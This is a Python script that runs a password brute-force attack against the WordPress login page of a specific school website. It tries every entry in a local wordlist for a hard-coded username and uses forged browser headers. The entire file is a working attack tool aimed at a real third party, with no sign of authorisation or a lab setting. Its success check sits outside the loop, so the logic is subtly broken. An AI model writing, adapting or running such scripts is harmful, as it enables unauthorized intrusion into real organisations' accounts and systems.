import sys
import requests
import threading

pwd = "0"

cookies = {
    'wordpress_test_cookie': 'WP+Cookie+check',
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Microsoft Edge";v="90"',
    'sec-ch-ua-mobile': '?0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://rnles.edu.in',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://rnles.edu.in/wp-login.php',
    'Accept-Language': 'en-US,en;q=0.9',
}

def Brute():
    print()
    print("[*] Started Brute Force Attack On Target")
    print("[+] Attacking")
    passwords = [x.strip() for x in open('Wordlist.txt', 'r').readlines() if x]
    
    for password in passwords:
        data = {
          'log': 'RNLS_School',
          'pwd': password,
          'wp-submit': 'Log In',
          'redirect_to': 'https://rnles.edu.in/wp-admin/',
          'testcookie': '1'
        }

        print("[*] Trying Password: " + password)

        response = requests.post('https://rnles.edu.in/wp-login.php', headers=headers, cookies=cookies, data=data)
        
    if "The password you entered for the username" not in response.text:
        print()
        print("[+] Password Found: " + password)
        pwd = "1"
        sys.exit()

try:
    thread = threading.Thread(target=Brute)
    thread.start()
    thread.join()
except KeyboardInterrupt:
    print("[-] Aborted")
    sys.exit()


if pwd == "0":
    print("[-] Password Not Found")
    sys.exit()
